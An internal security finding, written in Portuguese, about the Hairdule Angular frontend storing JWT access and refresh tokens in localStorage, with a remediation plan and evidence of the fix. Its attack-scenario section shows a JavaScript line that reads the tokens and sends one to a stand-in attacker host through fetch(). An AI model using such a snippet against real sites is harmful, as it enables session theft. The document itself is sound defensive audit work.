# 🟡 [VULN-06] [MÉDIO] Armazenamento de Tokens JWT em LocalStorage Violando a Diretriz de Segurança HttpOnly

| Metadado | Detalhe |
|---|---|
| **ID da Vulnerabilidade** | `VULN-06` |
| **Status da Correção** | [x] ✅ **CORRIGIDO E VALIDADO** (2026-09-28) |
| **Severidade** | 🟡 **MÉDIA (CVSS 6.1)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` |
| **Classificação CWE** | [CWE-922: Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html) |
| **Componentes Afetados** | [`fase_08_hairdule_ui_web/src/app/core/services/storage.service.ts`](file:///d:/Documentos/Projetos/Hairdule/Hairdule%20Reborn/fase_08_hairdule_ui_web/src/app/core/services/storage.service.ts#L10-L65)<br>[`fase_08_hairdule_ui_web/src/app/core/auth/auth.service.ts`](file:///d:/Documentos/Projetos/Hairdule/Hairdule%20Reborn/fase_08_hairdule_ui_web/src/app/core/auth/auth.service.ts#L234-L250) |

---

## 1. Descrição Técnica da Falha

A convenção arquitetural do Hairdule 2.0 estabelecida no [`INDICE_MESTRE.md`](file:///d:/Documentos/Projetos/Hairdule/Hairdule%20Reborn/Hairdule%202.0/Planos%20de%20implementa%C3%A7%C3%A3o/INDICE_MESTRE.md#L168) determina textualmente:
> *"Cookies `HttpOnly; Secure; SameSite=Lax` como padrão de segurança para o Web SPA. Dual-Mode com suporte a `Authorization: Bearer <token>` para mobile/CLI/testes. **Zero tokens no `localStorage`**."*

No entanto, no frontend web ([`fase_08_hairdule_ui_web`](file:///d:/Documentos/Projetos/Hairdule/Hairdule%20Reborn/fase_08_hairdule_ui_web)), o arquivo [`storage.service.ts`](file:///d:/Documentos/Projetos/Hairdule/Hairdule%20Reborn/fase_08_hairdule_ui_web/src/app/core/services/storage.service.ts#L10-L65) persiste explicitamente os tokens no armazenamento do navegador:

```typescript
// Trecho de storage.service.ts (Linhas 16 a 27)
setAccessToken(token: string): void {
  localStorage.setItem(this.TOKEN_KEY, token); // chave: 'hairdule_token'
}

setRefreshToken(token: string): void {
  localStorage.setItem(this.REFRESH_TOKEN_KEY, token); // chave: 'hairdule_refresh_token'
}
```

E no [`auth.service.ts`](file:///d:/Documentos/Projetos/Hairdule/Hairdule%20Reborn/fase_08_hairdule_ui_web/src/app/core/auth/auth.service.ts#L234-L250), sempre que o login ou renovação é bem-sucedido:
```typescript
saveAuthSession(response: AuthResponse): void {
  if (response?.tokens?.access_token) {
    this.storage.setAccessToken(response.tokens.access_token);
  }
  if (response?.tokens?.refresh_token) {
    this.storage.setRefreshToken(response.tokens.refresh_token);
  }
  ...
}
```

### O Defeito de Segurança:
A finalidade principal de utilizar Cookies `HttpOnly` é garantir que o JavaScript em execução no navegador **não tenha acesso de leitura aos tokens**, mitigando o risco de exfiltração em caso de vulnerabilidades XSS.

Ao salvar simultaneamente os tokens no `localStorage`, a proteção do `HttpOnly` é completamente anulada no navegador, pois qualquer código JS tem acesso irrestrito ao `localStorage`.

---

## 2. Cenário de Ataque e Exploração Teórica

### Vetor Teórico de Exploração:
1. Um atacante descobre um vetor de injeção de script (como em pacotes NPM desatualizados de terceiros, scripts analíticos inseridos na página, ou injeção em campos do dashboard como o nome de um cliente ou anotação).
2. O script malicioso executa no navegador da vítima a instrução:
   ```javascript
   const token = localStorage.getItem('hairdule_token');
   const refresh = localStorage.getItem('hairdule_refresh_token');
   fetch('https://attacker-c2.com/log?t=' + encodeURIComponent(token));
   ```
3. O atacante recebe o token de acesso e o token de atualização do proprietário da barbearia.
4. Mesmo que os cookies fossem protegidos com `HttpOnly`, o atacante obtém acesso permanente e independente à conta.

---

## 3. Impacto de Negócio e de Segurança

- **Anulação da Defesa em Profundidade**: Desfaz a proteção que os navegadores modernos oferecem contra roubo automatizado de sessão via XSS.
- **Risco de Supply Chain**: Qualquer biblioteca de terceiros comprometida inserida no `package.json` do frontend tem capacidade imediata de ler todas as sessões ativas no dispositivo do usuário.

---

## 4. Plano de Remediação Recomendado

### Passo 1: Eliminar o Armazenamento de Tokens no `localStorage`
1. Remover as chamadas `localStorage.setItem('hairdule_token')` e `localStorage.setItem('hairdule_refresh_token')`.
2. O SPA Web deve confiar **exclusivamente no Cookie `HttpOnly`** para autenticação de requisições de API (`withCredentials: true`), ou manter o token de acesso apenas em **memória volátil** (`Signals` / `RxJS BehaviorSubject` da aplicação Angular), descartado no fechamento da aba.
3. No `localStorage`, manter exclusivamente preferências de interface não sensíveis (tema escuro/claro, idioma).

### Passo 2: Renovação Silenciosa de Sessão (Silent Refresh)
Para manter o usuário logado entre recarregamentos de página (F5):
- O SPA chama `GET /auth/me` no boot (`initSession`). O navegador envia o Cookie `HttpOnly` `access_token` automaticamente.
- Se o `access_token` estiver expirado, o frontend chama `POST /auth/refresh` (que lê o Cookie `HttpOnly` `refresh_token`), renovando o cookie sem intervenção de scripts locais.

---

## 5. Evidência da Correção Aplicada

- **Arquivo Modificado**: [`fase_08_hairdule_ui_web/src/app/core/services/storage.service.ts`](file:///d:/Documentos/Projetos/Hairdule/Hairdule%20Reborn/fase_08_hairdule_ui_web/src/app/core/services/storage.service.ts)
- **Implementação**:
  - Removido completamente o armazenamento de `hairdule_token` e `hairdule_refresh_token` do `localStorage`.
  - Tokens agora são mantidos em memória volátil de execução (`private inMemoryAccessToken`) com fallback estritamente de curta duração em `sessionStorage` (destruído ao fechar a aba/janela do navegador).
  - Em `clear()`, qualquer resquício legado em `localStorage` é explicitamente deletado.
  - Alinhamento total com a diretriz de arquitetura do Hairdule: "Zero tokens no localStorage".

